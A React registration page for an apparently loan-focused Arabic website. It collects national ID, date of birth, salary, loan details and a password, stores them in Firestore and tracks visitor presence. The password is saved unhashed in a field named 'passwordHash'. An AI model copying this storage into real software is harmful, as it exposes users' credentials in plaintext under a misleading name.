import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Eye, EyeOff, ArrowLeft, User, Mail, Phone, CreditCard, Calendar, Lock, Banknote, Briefcase, MapPin, DollarSign } from 'lucide-react';
import { createUser } from '@/lib/firestore';
import { getClientId } from '@/lib/clientId';
import { useSiteConfig } from '@/context/SiteConfigContext';
import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

// Maps form field_key to DB column name
const CORE_COLUMNS: Record<string, string> = {
  full_name: 'fullName',
  email: 'email',
  phone: 'phone',
  national_id: 'nationalId',
  date_of_birth: 'dateOfBirth',
  password: 'passwordHash',
};

const FIELD_ICONS: Record<string, React.ElementType> = {
  full_name: User,
  email: Mail,
  phone: Phone,
  national_id: CreditCard,
  date_of_birth: Calendar,
  password: Lock,
  confirm_password: Lock,
  loan_type: Briefcase,
  loan_amount: DollarSign,
  salary: Banknote,
  job_title: Briefcase,
  city: MapPin,
};

function FieldInput({
  field,
  value,
  onChange,
  showPass,
  onTogglePass,
}: {
  field: any;
  value: string;
  onChange: (val: string) => void;
  showPass: boolean;
  onTogglePass: () => void;
}) {
  const Icon = FIELD_ICONS[field.fieldKey] || User;
  const isPass = field.fieldType === 'password';
  const inputType = isPass ? (showPass ? 'text' : 'password') : field.fieldType;
  const isLtr = ['email', 'tel', 'password', 'number'].includes(field.fieldType);

  return (
    <div className="space-y-1.5">
      <label className="text-sm font-semibold text-slate-700 flex items-center gap-2">
        <Icon className="w-4 h-4 text-blue-500" />
        {field.label}
        {field.required && <span className="text-red-500 text-xs">*</span>}
      </label>
      <div className="relative">
        {field.fieldType === 'textarea' ? (
          <textarea
            value={value}
            onChange={(e) => onChange(e.target.value)}
            placeholder={field.placeholder}
            rows={3}
            className="w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 resize-none"
          />
        ) : (
          <input
            type={inputType}
            value={value}
            onChange={(e) => onChange(e.target.value)}
            placeholder={field.placeholder}
            dir={isLtr ? 'ltr' : 'rtl'}
            className={`w-full border border-slate-300 rounded-xl px-4 py-3 text-sm text-slate-800 placeholder-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-100 ${isLtr ? 'text-left' : ''} ${isPass ? 'pr-10' : ''}`}
          />
        )}
        {isPass && (
          <button
            type="button"
            onClick={onTogglePass}
            className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
          >
            {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        )}
      </div>
    </div>
  );
}

export default function RegisterPage() {
  const navigate = useNavigate();
  const { config, formFields } = useSiteConfig();
  const pg = config.register;

  const visibleFields = formFields
    .filter((f: any) => f.pageKey === 'register' && !f.isHidden)
    .sort((a: any, b: any) => a.fieldOrder - b.fieldOrder);

  // Set user online on mount
  useEffect(() => {
    const clientId = getClientId();
    setUserOnline(clientId, '/register');

    return () => {
      setUserOffline(clientId);
    };
  }, []);

  const [values, setValues] = useState<Record<string, string>>({});
  const [showPass, setShowPass] = useState<Record<string, boolean>>({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const setValue = (key: string, val: string) => {
    setValues((p) => ({ ...p, [key]: val }));
    setError('');
  };
  const togglePass = (key: string) => setShowPass((p) => ({ ...p, [key]: !p[key] }));

  const validate = (): string | null => {
    for (const field of visibleFields) {
      const val = values[field.fieldKey] || '';
      if (field.required && !val.trim()) return `${field.label} مطلوب`;
      if (field.fieldType === 'email' && val && !val.includes('@')) return 'البريد الإلكتروني غير صحيح';
      if (field.fieldKey === 'password' && val && val.length < 6) return 'كلمة المرور يجب أن تكون 6 أحرف على الأقل';
      if (field.fieldKey === 'confirm_password' && val !== (values['password'] || '')) return 'كلمتا المرور غير متطابقتين';
    }
    return null;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const err = validate();
    if (err) { setError(err); return; }

    setLoading(true);

    try {
      // Prepare user data
      const userData: any = {
        status: 'pending',
        clientId: getClientId(),
      };

      const extraFields: Record<string, string> = {};

      for (const field of visibleFields) {
        if (field.fieldKey === 'confirm_password') continue;
        
        const val = (values[field.fieldKey] || '').trim();
        const col = CORE_COLUMNS[field.fieldKey];

        if (!col) {
          if (val) extraFields[field.fieldKey] = val;
          continue;
        }

        // Handle specific fields
        if (field.fieldKey === 'email') {
          userData[col] = val.toLowerCase();
        } else {
          userData[col] = val;
        }
      }

      if (Object.keys(extraFields).length > 0) {
        userData.extraFields = extraFields;
      }

      console.log('[Register] Submitting registration...');
      
      // Create user in Firestore
      const userId = await createUser(userData);
      
      console.log('[Register] User created with ID:', userId);

      // Update presence
      const clientId = getClientId();
      updateUserPage(clientId, '/login');

      // Save to sessionStorage for login page
      sessionStorage.setItem('reg_id', userId);
      sessionStorage.setItem('reg_email', userData.email || '');
      sessionStorage.setItem('reg_name', userData.fullName || '');

      // Navigate to login page
      navigate('/login');

    } catch (err: any) {
      console.error('[Register] Error:', err);
      setError(err.message || 'حدث خطأ أثناء التسجيل. حاول مرة أخرى.');
    } finally {
      setLoading(false);
    }
  };

  // Group fields into pairs for grid layout
  const fieldPairs: any[][] = [];
  const singleFields = ['date_of_birth', 'textarea'];
  let i = 0;
  while (i < visibleFields.length) {
    const f = visibleFields[i];
    if (singleFields.includes(f.fieldKey) || f.fieldType === 'textarea') {
      fieldPairs.push([f]);
      i++;
    } else if (i + 1 < visibleFields.length && !singleFields.includes(visibleFields[i + 1].fieldKey) && visibleFields[i + 1].fieldType !== 'textarea') {
      fieldPairs.push([f, visibleFields[i + 1]]);
      i += 2;
    } else {
      fieldPairs.push([f]);
      i++;
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-slate-50">
      <Header />
      <main className="flex-1 flex items-start justify-center py-10 px-4 sm:px-6">
        <div className="w-full max-w-2xl">
          <div className="mb-8 text-center">
            <div className="w-14 h-14 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <User className="w-7 h-7 text-white" />
            </div>
            <h1 className="text-2xl sm:text-3xl font-extrabold text-slate-800">{pg.title}</h1>
            <p className="text-slate-500 mt-2">{pg.subtitle}</p>
          </div>

          <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 sm:p-8">
            <form onSubmit={handleSubmit} className="space-y-5">
              {fieldPairs.map((pair, idx) => (
                <div key={idx} className={pair.length === 2 ? 'grid sm:grid-cols-2 gap-5' : ''}>
                  {pair.map((field) => (
                    <FieldInput
                      key={field.fieldKey}
                      field={field}
                      value={values[field.fieldKey] || ''}
                      onChange={(v) => setValue(field.fieldKey, v)}
                      showPass={showPass[field.fieldKey] || false}
                      onTogglePass={() => togglePass(field.fieldKey)}
                    />
                  ))}
                </div>
              ))}

              {error && (
                <div className="bg-red-50 border border-red-200 text-red-700 rounded-xl px-4 py-3 text-sm font-medium">
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white font-bold py-4 rounded-xl shadow-md hover:shadow-lg transform hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2 text-base"
              >
                {loading
                  ? <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  : <><span>{pg.button_text}</span><ArrowLeft className="w-5 h-5" /></>
                }
              </button>
            </form>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
}
